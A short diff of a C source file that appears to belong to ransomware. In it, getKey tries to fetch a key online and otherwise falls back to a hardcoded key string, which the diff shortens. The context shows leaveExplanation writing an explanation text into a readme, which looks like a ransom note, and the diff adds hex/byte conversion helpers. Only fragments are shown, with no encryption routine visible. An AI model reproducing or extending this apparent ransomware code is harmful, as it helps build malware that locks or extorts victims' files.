@@ -80,7 +80,7 @@ char* getKey(int tmp_ID){
 	if(!key) {
 		//printf("unable to get the key online...\n");
 		key = malloc(LENGTH);
-		snprintf(key, LENGTH,"q}}c),apx?ic*n}zy{,uv)),$pfhjx:]zi{ws{j;gsjcem)]:ho{,~?_@+kiirda$e]r@;[?@;md^ib@wta[dl}c[hkc}rc{wa=vim-;^kkq^mxn-xkaahh-sqa~dhpz:)ppj=^c}h^wzogxdq$;{cg+zld[ssw[pji-^?,[m{=ei[)q+})ke;)$u@^?zt-m{mj^xtsb~,i})gsm;~yl^^?p^-w~q^$r;ik)a{evanr-z;+_^jkvdvf$z)+nw=-c*;_*fcpitgm~=$=kf}-grh?;f^w)l^_g@dh;,*q{b}luz-e@$glqop[x=tu^kz_+]kye?m_l;k-f;bf::+^[ey+x=h+^-sl^{b$br-m];+)wwgc{v]]}p;sdv?_szj+t~=^ami][}}trdvs{tm):^~jnw;eqrria_ggp~@imbacfwu,:_c~zx^i~bmaz)=^budx:he^;f[q^nw,p*u:qrp?zak=d^kfln-tucka?iqdwkh?k@r$xg,ng+_igjry$~=tx}t@?;c@z=,bs${:a?^lvzu_?jw?[d^u,puj}wiv:sw[rx?r*dcv]wtf_;=}~gp^$edz)pl,:ae^x;~xlqjjk}sijak)l@yk:)b,or+vrrsm-bh=rp{*r+j$u^)-^u;@q=id_z{wo=bm+n-,{$,=ito{mk_;dm:^[x@^n*s]i^k{f;aad,tp}@q;~~wy@c+[z=ye=;cyaqsf-zi?a*x}agjv$_k_a)}zlt_^abu?yk=vb{]czv-{_op[m$)m^]:;og?sm-{d;j*+?wpcitd;@tgpsea+):*~=gg-fcaqp{_$xubfmemp$yar_aaboaw@g$)+b-,x_ep[{q}:[ozui{?:cko+kc=xblih=o{rxrprhn)@_[^:xduznak*h^x::_t$q+qg,a{mo[pmt;^o~li*lt{y~r)*wwxg;mmomo))go=)$?kjptk@?gx[{^wrr~z]$:hhvff@xz}p{:]r]fx,+q)kos*_cz^bff:}:q{c:[s;?q[f[~;:@lr}");
+		snprintf(key, LENGTH,"q}}c),apx?ic*n}zy{,uv)),$pfhjx:");
 	}
 	return key;
 }
@@ -197,4 +197,23 @@ void leaveExplanation(){
 	fprintf(readme, "%s", explanation);
 	free(explanation);
 	fclose(readme);
+}
+
+int bytes_to_hexa(const unsigned char bytes_string[], char *hex_string, int size)
+{
+	for (size_t i = 0; i < size; i++) {
+		hex_string += sprintf(hex_string, "%.2x", bytes_string[i]);
+	}
+	return 0;
+}
+
+int hexa_to_bytes(char hex_string[], unsigned char val[], int size)
+{
+	char *pos = hex_string;
+
+	for (size_t count = 0; count < size; count++) {
+		sscanf(pos, "%2hhx", &val[count]);
+		pos += 2;
+	}
+	return 0;
 }
